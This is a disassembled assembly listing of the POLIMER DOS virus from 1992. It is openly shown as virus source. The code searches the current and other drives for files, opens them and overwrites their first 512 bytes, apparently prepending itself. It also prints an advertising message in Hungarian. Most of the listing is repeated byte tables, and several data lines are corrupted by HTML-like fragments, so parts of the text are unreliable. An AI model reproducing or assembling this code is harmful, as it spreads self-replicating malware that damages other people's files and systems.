


PAGE  59,132

; Disassembled by Adam Jenkins using Sourcer, 1994
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        POLIMER				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   5-Sep-92					         ÛÛ
;ÛÛ      Passes:    9	       Analysis Options on: none	         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	16Ah
data_2e		equ	0			;*
data_3e		equ	16Ah			;*
data_5e		equ	0C8h			;*
data_7e		equ	0CAh			;*
data_9e		equ	0CCh			;*
data_10e	equ	16Ah			;*
data_11e	equ	16Ch			;*
data_12e	equ	0C8h			;*
data_14e	equ	0CAh			;*
data_19e	equ	0C8h			;*
data_21e	equ	0CAh			;*
data_26e	equ	80h			;*
data_27e	equ	0C8h			;*
data_29e	equ	0CAh			;*
data_32e	equ	162h			;*
data_36e	equ	0C0h			;*
data_37e	equ	0C8h			;*
data_39e	equ	0CAh			;*
data_42e	equ	103h			;*
data_43e	equ	128h			;*
data_46e	equ	2B9h			;*
data_49e	equ	0C0h
data_50e	equ	0C1h
data_51e	equ	0C8h
data_53e	equ	0CAh
data_89e	equ	0			;*
data_90e	equ	100h			;*
data_91e	equ	200h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

polimer		proc	far

start::
		jmp	loc_4
		db	 00h, 3Fh
		db	7 dup (3Fh)
		db	 43h, 4Fh, 4Dh, 00h, 02h, 00h
		db	 40h, 00h, 8Dh, 36h, 80h, 00h
		db	 03h, 00h
		db	14 dup (0)
data_59		db	'A legjobb kazetta a POLIMER kaze'
		db	'tta !   Vegye ezt !    ', 0Ah, 0Dh
		db	'$'
		db	'ERROR', 0Ah, 0Dh, '$'
data_60		dw	5
data_61		dw	147Dh
loc_1::
		mov	si,data_46e
		mov	di,data_49e
		mov	cx,30h
		cld				; Clear direction
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		jmp	$-0BAh
loc_2::
		jmp	loc_10
loc_3::
		jmp	loc_9
loc_4::
		mov	al,0
		mov	ah,0Eh
		int	21h			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
		mov	dx,data_36e
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	dx,data_43e
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
loc_5::
		mov	dx,data_42e
		mov	ah,11h
		int	21h			; DOS Services  ah=function 11h
						;  find filename, FCB @ ds:dx
		test	al,al
		jnz	loc_2			; Jump if not zero
loc_6::
		mov	word ptr ds:[0CCh],2424h
		mov	ax,word ptr ds:[0CAh]
		mov	word ptr ds:[0CBh],ax
		mov	ax,word ptr ds:[0C8h]
		mov	al,2Eh			; '.'
		mov	word ptr ds:[0C9h],ax
		mov	al,2
		mov	dx,data_50e
		mov	ah,3Dh			; '='
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_3			; Jump if carry Set
		mov	word ptr ds:[16Ah],ax
		mov	bx,word ptr ds:[16Ah]
		mov	cx,0
		mov	dx,0
		mov	al,2
		mov	ah,42h			; 'B'
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_3			; Jump if carry Set
		mov	word ptr ds:[16Ch],ax
		mov	bx,word ptr ds:[16Ah]
		mov	cx,0
		mov	dx,0
		mov	al,0
		mov	ah,42h			; 'B'
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		jc	loc_3			; Jump if carry Set
		mov	bx,word ptr ds:[16Ah]
		mov	cx,200h
		mov	dx,data_89e
		mov	ax,ds
		add	ax,1000h
		mov	ds,ax
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	cx,80h
		cld				; Clear direction
		mov	si,data_90e
		mov	di,200h
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jz	loc_8			; Jump if zero
		mov	bx,cs:data_60
		mov	cx,cs:data_61
		sub	cx,200h
		mov	dx,data_91e
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		mov	ax,ds
		sub	ax,1000h
		mov	ds,ax
		mov	bx,word ptr ds:[16Ah]
		mov	cx,0
		mov	dx,0
		mov	al,0
		mov	ah,42h			; 'B'
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		mov	bx,word ptr ds:[16Ah]
		mov	dx,100h
		mov	cx,200h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	bx,word ptr ds:[16Ah]
		mov	dx,data_2e
		mov	cx,word ptr ds:[16Ch]
		mov	ax,ds
		add	ax,1000h
		mov	ds,ax
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ax,ds
		sub	ax,1000h
		mov	ds,ax
		mov	bx,ds:data_1e
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	short loc_10
		db	90h
loc_7::
		mov	dx,data_42e
		mov	ah,12h
		int	21h			; DOS Services  ah=function 12h
						;  find next filenam, FCB @ds:dx
		test	al,al
		jnz	loc_10			; Jump if not zero
		jmp	loc_6
loc_8::
		mov	ax,ds
		sub	ax,1000h
		mov	ds,ax
		mov	bx,word ptr ds:[16Ah]
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	short loc_7
loc_9::
		mov	dx,data_32e
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
loc_10::
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		test	al,al
		jnz	loc_11			; Jump if not zero
		mov	dl,2
		mov	ah,0Eh
		int	21h			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		test	al,al
		jz	loc_11			; Jump if zero
		jmp	loc_5
loc_11::
		mov	dx,data_26e
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		jmp	loc_1
		db	0BEh, 00h, 03h
		db	0BFh, 00h, 01h,0B9h, 00h,0FDh
		db	0FCh,0F3h,0A4h,0EBh, 32h, 90h
		db	56 dup (0)
		db	0B4h, 4Ch,0CDh, 21h, 84h, 01h
		db	 02h, 03h, 04h, 05h, 06h, 07h
		db	 08h, 09h, 10h, 11h, 12h, 13h
		db	 14h, 15h, 16h, 17h, 18h, 19h
		db	' !"#$'
		db	'%&', 27h, '()0123456789@ABCEFGHI'
		db	'PQRSTUVWXY`abcdefghipqrvtuwxy'
		db	 80h, 81h, 82h
		db	 83h, 84h, 85h, 86h, 87h, 88h
		db	 89h, 90h, 91h, 92h, 93h, 94h
		db	 95h, 96h, 97h, 98h, 99h,0AAh
		db	0BBh,0CCh,0DDh,0EEh,0FFh,0CBh
		db	0DBh,0EBh,0ABh,0CDh,0CAh,0CEh
		db	0CFh,0FAh,0FEh,0FDh,0FCh,0FBh
		db	 00h
		db	 20h, 20h, 20h, 20h, 20h, 20h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
		db	 01h, 02h, 03h, 04h, 05h, 06h
		db	 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
		db	 0Dh, 0Eh, 0Fh, 10h, 11h, 12h
		db	 13h, 14h, 15h, 16h, 17h, 18h
		db	 19h, 1Ah, 1Bh, 1Ch, 1Dh, 1Eh
		db	 1Fh
		db	' !"#$'
		db	'%&', 27h, '()*+,-./0123456789:;<' db="" '="">?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\'
		db	']^_`abcdefghijklmnopqrstuvwxyz{|'
		db	'}~'
		db	 7Fh, 80h, 81h, 82h, 83h, 84h
		db	 85h, 86h, 87h, 88h, 89h, 8Ah
		db	 8Bh, 8Ch, 8Dh, 8Eh, 8Fh, 90h
		db	 91h, 92h, 93h, 94h, 95h, 96h
		db	 97h, 98h, 99h, 9Ah, 9Bh, 9Ch
		db	 9Dh, 9Eh, 9Fh,0A0h,0A1h,0A2h
		db	0A3h,0A4h,0A5h,0A6h,0A7h,0A8h
		db	0A9h,0AAh,0ABh,0ACh,0ADh,0AEh
		db	0AFh,0B0h,0B1h,0B2h,0B3h,0B4h
		db	0B5h,0B6h,0B7h,0B8h,0B9h,0BAh
		db	0BBh,0BCh,0BDh,0BEh,0BFh,0C0h
		db	0C1h,0C2h
		db	0C3h,0C4h,0C5h,0C6h,0C7h,0C8h
		db	0C9h,0CAh,0CBh,0CCh,0CDh,0CEh
		db	0CFh,0D0h,0D1h,0D2h,0D3h,0D4h
		db	0D5h,0D6h,0D7h,0D8h,0D9h,0DAh
		db	0DBh,0DCh,0DDh,0DEh,0DFh,0E0h
		db	0E1h,0E2h,0E3h,0E4h,0E5h,0E6h
		db	0E7h,0E8h,0E9h,0EAh,0EBh,0ECh
		db	0EDh,0EEh,0EFh,0F0h,0F1h,0F2h
		db	0F3h,0F4h,0F5h,0F6h,0F7h,0F8h
		db	0F9h,0FAh,0FBh,0FCh,0FDh,0FEh
		db	0FFh, 00h
